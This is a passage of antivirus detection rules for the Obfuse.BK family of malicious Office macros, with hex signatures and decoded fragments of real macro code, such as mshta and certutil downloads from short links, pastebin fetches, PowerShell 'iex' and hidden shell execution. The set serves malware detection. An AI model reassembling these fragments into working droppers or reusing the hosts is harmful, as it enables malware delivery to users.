		$a_01_1 = {4f 70 65 6e 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 } //01 00  Open Application.ActiveWorkbook.Path
		$a_01_2 = {3d 20 50 63 71 77 73 5f 4f 46 6d 55 49 73 6a 69 62 59 55 6b 2e 53 49 48 49 54 73 4a 4c 68 68 56 67 54 50 6b 41 4f 59 4f 76 68 } //01 00  = Pcqws_OFmUIsjibYUk.SIHITsJLhhVgTPkAOYOvh
		$a_01_3 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 43 4c 6e 67 28 28 } //00 00  .ShowWindow = CLng((
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_32{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 50 53 66 5f 69 45 59 4c 5f 4b 6f 48 65 73 6a 55 42 6c 55 67 48 4e 75 63 5f 6c 57 2e } //01 00  = Replace(PSf_iEYL_KoHesjUBlUgHNuc_lW.
		$a_01_1 = {4f 70 65 6e 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 } //01 00  Open Application.ActiveWorkbook.Path
		$a_01_2 = {3d 20 49 73 41 72 72 61 79 28 49 73 4e 75 6d 65 72 69 63 28 } //01 00  = IsArray(IsNumeric(
		$a_01_3 = {3d 20 67 74 6c 5f 5f 4f 45 66 71 76 5f 67 48 42 7a 56 52 5a 45 49 62 75 6c 7a 6e 5f 61 70 64 62 2e } //00 00  = gtl__OEfqv_gHBzVRZEIbulzn_apdb.
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_33{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 66 65 69 78 62 20 2b 20 73 6f 20 2b 20 68 6f 20 2b 20 22 74 61 20 68 74 74 70 3a 2f 2f 25 32 30 25 32 30 40 6a 2e 6d 70 2f 61 73 64 61 6b 73 61 73 64 61 73 64 6f 64 6b 61 73 6f 64 6b 61 6f 73 22 } //01 00  = feixb + so + ho + "ta http://%20%20@j.mp/asdaksasdasdodkasodkaos"
		$a_01_1 = {66 65 69 78 62 20 3d 20 22 6d 22 } //01 00  feixb = "m"
		$a_01_2 = {73 6f 20 3d 20 22 73 22 } //01 00  so = "s"
		$a_01_3 = {68 6f 20 3d 20 22 68 22 } //01 00  ho = "h"
		$a_01_4 = {43 61 6c 6c 20 53 68 65 6c 6c } //01 00  Call Shell
		$a_01_5 = {53 75 62 20 41 75 74 6f 5f 43 6c 6f 73 65 28 29 } //00 00  Sub Auto_Close()
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_34{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 4e 6c 63 5a 6b 48 41 47 61 4b 2e 6d 78 71 6a 71 5a 68 57 51 49 54 6b 5f 70 5f 70 7a 68 5f 73 62 45 } //01 00  = Replace(NlcZkHAGaK.mxqjqZhWQITk_p_pzh_sbE
		$a_01_1 = {4f 70 65 6e 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 } //01 00  Open Application.ActiveWorkbook.Path
		$a_01_2 = {3d 20 6e 77 59 48 74 76 5f 4c 6a 2e 72 73 72 63 6c 4f 78 45 53 67 58 47 55 66 5a 58 49 53 53 70 72 } //01 00  = nwYHtv_Lj.rsrclOxESgXGUfZXISSpr
		$a_01_3 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 43 4c 6e 67 28 28 } //00 00  .ShowWindow = CLng((
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_35{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 50 22 20 2b 20 51 4b 52 66 54 51 53 47 43 28 66 6a 6b 65 72 6f 6f 6f 73 29 2c 20 51 4b 52 66 54 51 53 47 43 28 66 67 66 6a 68 66 67 66 67 29 2c 20 22 22 2c 20 22 22 2c 20 30 } //01 00  .ShellExecute "P" + QKRfTQSGC(fjkerooos), QKRfTQSGC(fgfjhfgfg), "", "", 0
		$a_01_1 = {3d 20 41 52 46 47 69 6f 4f 57 62 56 76 55 7a 69 59 78 28 61 53 4d 61 73 6a 72 54 57 75 66 6c 2c 20 74 37 67 68 30 29 } //01 00  = ARFGioOWbVvUziYx(aSMasjrTWufl, t7gh0)
		$a_01_2 = {3d 20 51 4b 52 66 54 51 53 47 43 20 26 20 4d 69 64 28 73 2c 20 70 2c 20 31 29 } //00 00  = QKRfTQSGC & Mid(s, p, 1)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_36{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 6d 6e 79 4a 6b 2e 70 64 66 22 } //01 00  = "c:\programdata\mnyJk.pdf"
		$a_01_1 = {62 74 4f 6c 78 28 50 44 4d 7a 67 29 2e 65 78 65 63 20 28 71 75 6c 64 64 29 } //01 00  btOlx(PDMzg).exec (quldd)
		$a_01_2 = {3d 20 74 6a 64 49 4e 28 56 4d 6d 43 55 29 20 26 20 22 20 22 20 26 20 61 56 7a 4c 6b } //01 00  = tjdIN(VMmCU) & " " & aVzLk
		$a_01_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 47 7a 6b 42 4e 28 33 29 20 26 20 22 2e 22 20 26 20 47 7a 6b 42 4e 28 33 29 20 26 20 22 72 65 71 75 65 73 74 2e 35 2e 31 22 29 } //00 00  = CreateObject(GzkBN(3) & "." & GzkBN(3) & "request.5.1")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_37{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {4f 70 65 6e 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 42 6c 6f 62 65 72 73 2e 76 62 73 22 } //01 00  Open "C:\ProgramData\Blobers.vbs"
		$a_01_1 = {53 65 74 20 4d 61 6d 74 65 72 73 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 55 73 65 72 46 6f 72 6d 31 2e 54 61 67 29 } //01 00  Set Mamters = CreateObject(UserForm1.Tag)
		$a_01_2 = {4d 61 6d 74 65 72 73 2e 45 78 65 63 20 55 73 65 72 46 6f 72 6d 31 2e 4c 61 62 65 6c 31 2e 54 61 67 } //01 00  Mamters.Exec UserForm1.Label1.Tag
		$a_01_3 = {4f 70 65 6e 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 46 45 72 69 6f 2e 76 62 73 22 } //00 00  Open "C:\ProgramData\FErio.vbs"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_38{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 63 6d 64 2e 65 78 65 22 } //01 00  .Document.Application.ShellExecute "cmd.exe"
		$a_01_1 = {2f 63 20 63 65 72 74 75 74 69 6c 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 } //01 00  /c certutil -urlcache -split -f
		$a_03_2 = {68 74 74 70 73 3a 2f 2f 64 6f 63 73 2e 69 74 73 68 65 61 6c 74 68 70 72 6f 2e 63 6f 6d 2f 65 6e 64 70 6f 69 6e 74 2f 90 02 0a 2e 6a 73 90 00 } //01 00 
		$a_01_3 = {64 65 6c 20 25 74 65 6d 70 25 5c 6a 73 63 72 69 70 74 2e 6a 73 } //00 00  del %temp%\jscript.js
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_39{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 72 6f 6a 75 75 62 61 73 77 68 79 6c 20 26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 62 63 78 70 75 6e 6e 73 68 65 63 76 2c 20 73 6b 72 74 64 6f 62 71 78 66 69 69 2c 20 32 29 29 29 } //01 00  = rojuubaswhyl & Chr$(Val("&H" & Mid$(bcxpunnshecv, skrtdobqxfii, 2)))
		$a_01_1 = {3d 20 31 20 54 6f 20 4c 65 6e 28 67 7a 6a 67 73 6f 68 76 68 6a 78 63 29 20 53 74 65 70 20 32 } //01 00  = 1 To Len(gzjgsohvhjxc) Step 2
		$a_01_2 = {3d 20 53 70 61 63 65 28 46 69 6c 65 4c 65 6e } //01 00  = Space(FileLen
		$a_01_3 = {53 6c 65 65 70 20 73 6c 65 65 70 4e 62 53 65 63 6f 6e 64 73 20 2a 20 31 30 30 30 } //00 00  Sleep sleepNbSeconds * 1000
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_40{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 67 6f 67 6f 2e 43 72 65 61 74 65 28 22 6d 73 68 74 61 20 68 74 74 70 3a 5c 5c 6a 2e 6d 70 2f 34 73 64 6e 34 73 6b 6e 6b 34 6e 73 6b 66 22 2c 20 4e 75 6c 6c 2c 20 6f 62 6a 43 6f 6e 66 69 67 2c 20 69 6e 74 67 6f 67 6f 49 44 29 } //01 00  = gogo.Create("mshta http:\\j.mp/4sdn4sknk4nskf", Null, objConfig, intgogoID)
		$a_01_1 = {3d 20 6c 6f 76 65 32 2e 47 65 74 28 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 } //01 00  = love2.Get("Win32_Process")
		$a_01_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 62 65 6d 53 63 72 69 70 74 69 6e 67 2e 53 57 62 65 6d 4c 6f 63 61 74 6f 72 22 29 } //00 00  = CreateObject("WbemScripting.SWbemLocator")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_41{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 63 30 3a 31 5c 62 70 63 72 33 6f 30 67 66 72 65 61 64 6d 37 64 31 61 37 74 65 61 31 5c 66 34 39 34 31 38 31 35 33 39 32 2e 32 6a 34 70 63 67 39 22 } //01 00  = "c0:1\bpcr3o0gfreadm7d1a7tea1\f4941815392.2j4pcg9"
		$a_01_1 = {53 65 74 20 65 34 61 66 33 64 37 64 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 } //01 00  Set e4af3d7d = CreateObject("wscript.shell")
		$a_01_2 = {43 61 6c 6c 20 65 34 61 66 33 64 37 64 2e 65 78 65 63 28 63 37 35 38 63 61 30 61 20 26 20 22 20 22 20 26 20 64 30 61 64 65 37 39 32 28 64 36 61 30 37 62 36 61 29 29 } //00 00  Call e4af3d7d.exec(c758ca0a & " " & d0ade792(d6a07b6a))
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_42{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 63 63 3a 36 5c 31 70 36 72 63 6f 61 67 31 72 65 61 62 6d 37 64 66 61 33 74 61 61 38 5c 36 36 37 32 37 36 66 31 39 37 64 2e 33 6a 31 70 37 67 64 22 } //01 00  = "cc:6\1p6rcoag1reabm7dfa3taa8\667276f197d.3j1p7gd"
		$a_01_1 = {53 65 74 20 61 66 64 64 38 64 31 61 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 } //01 00  Set afdd8d1a = CreateObject("wscript.shell")
		$a_01_2 = {43 61 6c 6c 20 61 66 64 64 38 64 31 61 2e 65 78 65 63 28 63 30 37 65 63 32 65 38 20 26 20 22 20 22 20 26 20 65 61 63 39 31 38 65 31 28 62 30 38 66 30 62 61 31 29 29 } //00 00  Call afdd8d1a.exec(c07ec2e8 & " " & eac918e1(b08f0ba1))
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_43{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {4f 70 65 6e 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 4b 6f 6c 65 73 74 65 72 2e 76 62 73 22 } //01 00  Open "C:\ProgramData\Kolester.vbs"
		$a_01_1 = {4f 70 65 6e 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 48 65 6c 70 6f 74 2e 76 62 73 22 } //01 00  Open "C:\ProgramData\Helpot.vbs"
		$a_01_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 42 69 6c 6f 64 65 72 2e 4d 6f 6e 74 65 6c 61 72 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 29 } //01 00  = CreateObject(Biloder.Montelar.ControlTipText)
		$a_01_3 = {2e 45 78 65 63 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 44 65 66 61 75 6c 74 54 61 72 67 65 74 46 72 61 6d 65 } //00 00  .Exec ThisDocument.DefaultTargetFrame
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_44{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {4f 70 65 6e 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 4b 6f 6c 65 73 74 65 72 2e 76 62 73 22 } //01 00  Open "C:\ProgramData\Kolester.vbs"
		$a_01_1 = {4f 70 65 6e 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 48 65 6c 70 6f 74 2e 76 62 73 22 } //01 00  Open "C:\ProgramData\Helpot.vbs"
		$a_01_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 58 4d 4c 53 61 76 65 54 68 72 6f 75 67 68 58 53 4c 54 29 } //01 00  = CreateObject(ThisDocument.XMLSaveThroughXSLT)
		$a_01_3 = {2e 45 78 65 63 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 44 65 66 61 75 6c 74 54 61 72 67 65 74 46 72 61 6d 65 } //00 00  .Exec ThisDocument.DefaultTargetFrame
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_45{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 52 75 6e 20 50 49 4e 43 48 50 45 4e 4e 59 5f 45 4e 4c 41 52 44 49 4e 47 5f 54 45 4c 45 53 45 53 5f 54 2e 46 4c 49 4e 44 45 52 41 55 52 4f 52 41 4c 50 59 52 4f 53 54 41 54 53 } //01 00  .Run PINCHPENNY_ENLARDING_TELESES_T.FLINDERAURORALPYROSTATS
		$a_01_1 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 73 77 61 69 6e 69 73 68 6e 65 73 73 65 73 5f 6d 61 75 73 6f 6c 65 61 2e 66 69 6e 6f 63 63 68 69 6f 64 75 63 6b 69 65 73 74 61 6e 61 67 72 61 6d 6d 61 74 69 73 65 28 29 } //01 00  .SaveToFile swainishnesses_mausolea.finocchioduckiestanagrammatise()
		$a_01_2 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4c 65 6e 28 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79 29 } //00 00  Debug.Print Len(.responseBody)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_46{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 49 6e 74 65 72 6e 65 74 45 78 70 6c 6f 72 65 72 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 } //01 00  = CreateObject("InternetExplorer.Application")
		$a_01_1 = {2e 4e 61 76 69 67 61 74 65 20 22 68 74 74 70 73 3a 2f 2f 70 61 73 74 65 62 69 6e 2e 63 6f 6d 2f 72 61 77 2f 62 38 32 56 56 66 63 5a 22 } //01 00  .Navigate "https://pastebin.com/raw/b82VVfcZ"
		$a_01_2 = {41 63 74 69 6f 6e 2e 50 61 74 68 20 3d 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 63 6d 64 2e 65 78 65 20 2f 71 20 2f 63 20 25 54 45 4d 50 25 5c 6c 61 75 6e 63 68 65 72 2e 62 61 74 22 } //00 00  Action.Path = "C:\Windows\System32\cmd.exe /q /c %TEMP%\launcher.bat"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_47{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {58 4d 4c 48 54 54 50 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 52 65 70 6c 61 63 65 28 22 68 74 74 70 3a 2f 2f 6e 61 64 69 6d 2e 77 6f 72 6b 2f 64 65 6d 6f 2e 64 6f 63 22 2c 20 22 5c 22 2c 20 22 2f 22 29 2c 20 22 46 61 6c 73 65 22 } //01 00  XMLHTTP.Open "GET", Replace("http://nadim.work/demo.doc", "\", "/"), "False"
		$a_01_1 = {41 44 4f 53 74 72 65 61 6d 2e 53 61 76 65 54 6f 46 69 6c 65 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c 74 6d 70 2e 64 6f 63 22 2c 20 32 } //01 00  ADOStream.SaveToFile "C:\Windows\Temp\tmp.doc", 2
		$a_01_2 = {46 69 6c 65 4e 61 6d 65 3a 3d 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c 74 6d 70 2e 64 6f 63 22 } //00 00  FileName:="C:\Windows\Temp\tmp.doc"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_48{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 77 63 61 74 73 6d 64 6f 67 73 66 65 65 74 3a 5c 5c 2e 5c 72 6f 6f 74 5c 43 49 4d 56 32 22 } //01 00  = "wcatsmdogsfeet:\\.\root\CIMV2"
		$a_01_1 = {3d 20 52 65 70 6c 61 63 65 28 73 74 72 2c 20 22 69 6e 70 65 72 69 6c 22 2c 20 4d 69 64 28 4c 43 61 73 65 28 64 65 63 72 79 70 74 56 61 6c 75 65 29 2c 20 31 2c 20 33 29 29 } //01 00  = Replace(str, "inperil", Mid(LCase(decryptValue), 1, 3))
		$a_01_2 = {3d 20 22 70 6f 77 6e 6f 70 68 69 64 63 6f 6d 6d 3b 69 65 78 20 24 65 6c 6c 65 72 73 68 22 } //01 00  = "pownophidcomm;iex $ellersh"
		$a_01_3 = {73 69 2e 53 54 41 52 54 55 50 49 4e 46 4f 2e 77 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 53 57 5f 48 49 44 45 } //00 00  si.STARTUPINFO.wShowWindow = SW_HIDE
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_49{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {55 52 4c 20 3d 20 22 68 74 74 70 3a 2f 2f 77 61 72 7a 79 77 6b 61 6d 79 6c 6f 76 65 2e 35 76 2e 70 6c 2f 63 6f 72 65 2e 65 78 65 22 } //01 00  URL = "http://warzywkamylove.5v.pl/core.exe"
		$a_01_1 = {57 69 6e 48 74 74 70 52 65 71 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 55 52 4c 2c 20 46 61 6c 73 65 } //01 00  WinHttpReq.Open "GET", URL, False
		$a_01_2 = {43 61 6c 6c 20 53 68 65 6c 6c 28 22 63 6d 64 2e 65 78 65 20 2f 63 20 63 68 63 70 20 31 32 35 30 20 26 20 63 64 20 22 20 26 20 50 61 74 68 20 26 20 22 20 26 20 63 6f 72 65 2e 65 78 65 20 2f 73 74 65 78 74 20 64 75 6d 70 2e 74 78 74 22 2c 20 76 62 48 69 64 65 29 } //00 00  Call Shell("cmd.exe /c chcp 1250 & cd " & Path & " & core.exe /stext dump.txt", vbHide)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_50{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 61 6c 6c 20 61 32 30 31 36 35 34 66 2e 65 78 65 63 28 62 61 63 37 64 34 36 64 29 } //01 00  Call a201654f.exec(bac7d46d)
		$a_01_1 = {63 38 37 62 32 63 65 61 2e 63 30 63 37 64 37 32 35 20 61 30 61 36 36 63 64 39 20 26 20 22 20 22 20 26 20 62 33 61 64 32 65 66 61 } //01 00  c87b2cea.c0c7d725 a0a66cd9 & " " & b3ad2efa
		$a_01_2 = {61 30 61 36 36 63 64 39 20 3d 20 61 39 30 36 32 36 63 63 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 29 } //01 00  a0a66cd9 = a90626cc(ActiveDocument.Shapes(1).Title)
		$a_01_3 = {62 33 61 64 32 65 66 61 20 3d 20 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //00 00  b3ad2efa = Environ("temp") & "\main.theme"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_51{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 61 6c 6c 20 64 33 38 33 33 35 61 62 2e 65 78 65 63 28 62 62 61 37 38 31 30 62 29 } //01 00  Call d38335ab.exec(bba7810b)
		$a_01_1 = {64 34 63 30 37 35 35 31 20 3d 20 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //01 00  d4c07551 = Environ("temp") & "\main.theme"
		$a_01_2 = {66 33 30 34 39 32 62 64 20 3d 20 66 35 64 36 31 36 30 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 29 } //01 00  f30492bd = f5d6160e(ActiveDocument.Shapes(1).Title)
		$a_01_3 = {61 30 65 31 36 37 32 33 2e 64 32 63 61 38 36 65 37 20 66 33 30 34 39 32 62 64 20 26 20 22 20 22 20 26 20 64 34 63 30 37 35 35 31 } //00 00  a0e16723.d2ca86e7 f30492bd & " " & d4c07551
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_52{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 61 6c 6c 20 65 65 62 64 33 37 31 34 2e 65 78 65 63 28 64 33 35 38 35 64 36 31 29 } //01 00  Call eebd3714.exec(d3585d61)
		$a_01_1 = {64 33 62 64 33 32 36 31 2e 64 33 39 37 64 63 38 63 20 63 32 31 63 37 35 39 61 20 26 20 22 20 22 20 26 20 61 34 37 64 33 38 34 61 } //01 00  d3bd3261.d397dc8c c21c759a & " " & a47d384a
		$a_01_2 = {61 34 37 64 33 38 34 61 20 3d 20 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //01 00  a47d384a = Environ("temp") & "\main.theme"
		$a_01_3 = {63 32 31 63 37 35 39 61 20 3d 20 61 30 65 61 32 32 31 62 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 31 29 2e 54 69 74 6c 65 29 } //00 00  c21c759a = a0ea221b(ActiveDocument.Shapes(1).Title)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_53{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 } //01 00  = CreateObject("wscript.shell")
		$a_01_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 61 32 32 63 61 37 31 66 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 } //01 00  = ActiveDocument.Shapes(a22ca71f).AlternativeText
		$a_01_2 = {43 61 6c 6c 20 65 33 35 66 66 65 31 34 2e 65 78 65 63 28 63 32 30 36 65 31 30 65 29 } //01 00  Call e35ffe14.exec(c206e10e)
		$a_01_3 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 61 32 32 63 61 37 31 66 29 2e 54 69 74 6c 65 20 2b 20 22 20 22 20 2b 20 63 65 66 34 63 66 65 66 } //00 00  = ActiveDocument.Shapes(a22ca71f).Title + " " + cef4cfef
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_54{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 } //01 00  = CreateObject("wscript.shell")
		$a_01_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 61 32 32 63 61 37 31 66 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 } //01 00  = ActiveDocument.Shapes(a22ca71f).AlternativeText
		$a_01_2 = {43 61 6c 6c 20 65 63 62 35 34 32 63 38 2e 65 78 65 63 28 66 32 63 38 61 61 35 32 29 } //01 00  Call ecb542c8.exec(f2c8aa52)
		$a_01_3 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 61 32 32 63 61 37 31 66 29 2e 54 69 74 6c 65 20 2b 20 22 20 22 20 2b 20 63 65 66 34 63 66 65 66 } //00 00  = ActiveDocument.Shapes(a22ca71f).Title + " " + cef4cfef
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_55{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
